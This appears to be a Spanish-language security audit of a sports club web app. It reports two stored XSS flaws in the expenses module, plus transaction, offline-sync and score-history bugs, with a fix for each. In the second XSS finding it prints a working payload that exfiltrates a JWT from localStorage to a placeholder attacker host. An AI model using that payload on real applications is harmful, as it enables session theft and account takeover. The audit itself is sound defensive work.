# Revisión de punta a punta — club-deportivo-app (rama cliente/calamena)
Fecha: 2026-08-19

Alcance: 82 archivos fuente (backend Node/Express/MySQL + frontend JS vanilla/PWA), revisión completa del código actual (no solo el diff pendiente). Metodología: sub-agente de identificación + sub-agentes independientes de verificación/falsos-positivos por hallazgo, más verificación manual de líneas citadas.

---

## VULNERABILIDADES DE SEGURIDAD

### 🔴 Vuln 1 — XSS almacenado vía comprobante de gasto con extensión/MIME falsificado
**Archivos:** `backend/middleware/uploadComprobante.js:17-35`, `backend/controllers/gastoController.js:100-119`, `frontend/js/gastos.js:188-201`
**Severidad:** Alta · **Confianza:** 9/10

`uploadComprobante.js` valida el tipo de archivo solo por `file.mimetype`, que es un header enviado por el cliente y trivialmente falsificable (no depende del selector de archivos del navegador; cualquiera puede armar el `multipart/form-data` a mano). El nombre guardado se arma con `path.extname(file.originalname)` **sin whitelist de extensión**, así que basta con declarar `Content-Type: image/jpeg` pero `filename: "factura.html"` para pasar el filtro y guardar un `.html` en disco.

Al descargarlo, `descargarComprobante` usa `res.sendFile(rutaArchivo)` sin forzar `Content-Type` ni `Content-Disposition: attachment`, así que Express sirve el archivo como `text/html` según su extensión real. El frontend (`verComprobanteGasto`) hace `fetch → blob() → URL.createObjectURL → window.open(url, '_blank')`; ese `blob:` heredará el origen de la app, por lo que cualquier `<script>` dentro del HTML subido se ejecuta en el mismo origen, con acceso a `localStorage.getItem('token')`.

**Explotación:** un usuario con rol `tesorero` (tiene acceso a `POST /gastos`) sube un comprobante que en realidad es HTML con `<script>` que exfiltra el token. Cuando un `admin` abre "Ver comprobante" desde el módulo de Gastos, el script corre en su sesión y roba su JWT (válido ~20 días), dando control administrativo completo al atacante.

**Recomendación:**
- Validar el contenido real del archivo (magic bytes / librería tipo `file-type`), no el `mimetype` declarado.
- Whitelist de extensiones permitidas en el servidor (`.jpg .jpeg .png .webp .pdf`), independiente de `originalname`.
- Servir comprobantes con `Content-Disposition: attachment` y un `Content-Type` fijo derivado del tipo validado, nunca de la extensión almacenada.
- Ideal a mediano plazo: servir `uploads/` desde un subdominio/origen separado sin acceso a `localStorage` de la app.

---

### 🔴 Vuln 2 — XSS almacenado en campos de Gastos (descripcion/categoria/responsable)
**Archivos:** `backend/controllers/gastoController.js:6-36,60`, `frontend/js/gastos.js:144-163`
**Severidad:** Alta · **Confianza:** 9/10

`textoValido` en `gastoController.js` es `/[a-zA-Z0-9áéíóúÁÉÍÓÚñÑ]/.test(texto)` **sin anclar** (`^...$`) — solo exige que exista *algún* carácter alfanumérico en el string, no restringe el resto. Compárese con `eventoController.js`, que sí ancla con `^[...]+$`. `responsable` ni siquiera pasa por esta validación (solo `.trim()`).

Estos tres campos se guardan tal cual y se renderizan en `frontend/js/gastos.js` mediante `tabla.innerHTML = ...` con un template literal sin escapar (`<td>${gasto.descripcion}</td>`, etc.). El proyecto ya tiene un helper de escape (`escaparFormacion()` en `frontend/js/formaciones.js`) que `gastos.js` no usa. No hay CSP configurada en ninguna parte de la app que mitigue esto.

**Explotación:** un `tesorero` crea un gasto con `descripcion: "<img src=x onerror=fetch('https://atacante/x?t='+localStorage.getItem('token'))>"` — pasa la validación porque contiene letras. Cualquier `admin`/`tesorero` que abra la pestaña Gastos ejecuta el payload y pierde su JWT.

**Recomendación:**
- Escapar `categoria`, `descripcion` y `responsable` antes de insertarlos en `innerHTML` (reutilizar `escaparFormacion()` o cambiar a `textContent`).
- Anclar `textoValido` en `gastoController.js` igual que en `eventoController.js`, y validar `responsable` con la misma función.

---

## BUGS DE LÓGICA / INTEGRIDAD DE DATOS

### 🟠 Bug 1 — Pago anual sin transacción: cuotas pueden quedar "pagadas" sin respaldo
**Archivo:** `backend/controllers/pagoController.js:197-226`
**Severidad:** Alta

`crearAnual` inserta el pago y luego, por cada cuota seleccionada, llama `crearDetalleCuota` + `marcarCuotaPagada` **en paralelo** (dentro de un `forEach`), sin transacción de base de datos (a diferencia de `formacionModel.reemplazarPosiciones`, que sí usa `beginTransaction/commit/rollback`). Si falla una cuota después de que otras ya se marcaron pagadas, el código borra el `pago` completo (`eliminarPago`), lo que por `ON DELETE CASCADE` elimina los `pago_detalle` de **todas** las cuotas del lote — incluidas las que sí tenían éxito — pero **no revierte** `marcarCuotaPagada` de esas cuotas.

**Escenario concreto:** un integrante paga 3 cuotas (oct/nov/dic) en un pago anual. Oct y Nov se procesan bien; Dic falla por un error transitorio de BD. Se borra el pago completo, pero Oct/Nov quedan con `estado='pagado'` y saldo real pendiente (sin `pago_detalle`). Como `obtenerCuotasPendientesPorPersona` solo trae `estado IN ('pendiente','vencido')`, esas cuotas nunca vuelven a aparecer para cobro, ni pueden re-marcarse — requiere corrección manual en la BD.

**Recomendación:** envolver `crearPago` + todos los `crearDetalleCuota` + todos los `marcarCuotaPagada` en una sola transacción; hacer rollback completo ante cualquier fallo individual.

---

### 🟡 Bug 2 — Sync offline de asistencias no maneja respuestas HTTP de error (queda "pendiente" para siempre)
**Archivo:** `frontend/js/offline-db.js:126-142`
**Severidad:** Media

El loop de sincronización solo contempla dos casos: `res.ok` (borra y cuenta como sincronizado) o excepción de red (`catch { break }`). Una respuesta HTTP no-2xx (400/409/500) no cae en ninguna rama: el registro no se borra ni se detiene el loop, simplemente sigue "pendiente" para siempre.

**Escenario concreto:** el POST llega al servidor y se inserta la asistencia, pero la respuesta se pierde por corte de conexión — el `fetch` lanza excepción, el loop hace `break`, el registro queda `pendiente`. En el próximo reintento (backoff 30s/60s/300s) se reenvía el mismo registro; el `UNIQUE(evento_id, persona_id)` de la BD devuelve 409. `res.ok` es `false` → el registro nunca se borra ni se marca sincronizado, reintenta indefinidamente y el badge de pendientes queda atascado.

**Recomendación:** tratar `res.status === 409` como éxito terminal (la asistencia ya existe en el servidor) — borrar el registro local igual que en el caso `res.ok`.

---

### 🟡 Bug 3 — Historial de puntaje omite todos los puntos ganados por pago de cuotas
**Archivo:** `backend/models/puntajeModel.js:30-44`
**Severidad:** Media

`obtenerHistorial` (usado por el modal de historial en `frontend/js/puntaje.js`) hace `JOIN eventos e ON pt.evento_id = e.id` (**INNER JOIN**). Pero `insertarPuntajeCuota` (disparado al pagar una cuota, Fase 2 Art. 9.2/9.3) inserta filas de `puntajes` con `evento_id = NULL` — la columna es nullable. El INNER JOIN descarta silenciosamente toda fila con `evento_id IS NULL`.

**Escenario concreto:** un integrante paga una cuota a tiempo y gana +10/+20 puntos. `vista_ranking_puntaje` suma esos puntos correctamente en `puntaje_total` (no depende del JOIN), así que el ranking se ve bien. Pero si un administrador abre el historial de esa persona para auditar de dónde salen los puntos, el modal —construido con el INNER JOIN— nunca muestra las entradas de pago de cuota, solo las de asistencia. La suma visible en el modal no cuadra con el total del ranking, sin ninguna indicación de que faltan filas — el rastro de auditoría es engañoso.

**Recomendación:** cambiar a `LEFT JOIN eventos e ON pt.evento_id = e.id` y agregar una etiqueta de respaldo (ej. `'Pago de cuota'`) cuando `pt.cuota_id IS NOT NULL`, para que esas filas aparezcan en el historial.

---

## Resumen
- **2 vulnerabilidades XSS de severidad alta** en el módulo de Gastos (validación de subida de archivos y falta de escape en el render), ambas con cadena de explotación confirmada línea por línea, sin CSP que mitigue.
- **1 bug alto** de integridad financiera (pago anual sin transacción → cuotas "pagadas" sin respaldo, requiere corrección manual).
- **2 bugs medios**: sync offline de asistencias que se atasca en reintento infinito ante 409, e historial de puntaje que oculta silenciosamente los puntos ganados por pago de cuota.
- Revisión limpia (sin hallazgos de alta confianza) en: inyección SQL (los 13 modelos usan parámetros `?` correctamente), autenticación/JWT, control de acceso por rol en rutas, CORS, y exposición de datos sensibles en respuestas de la API.
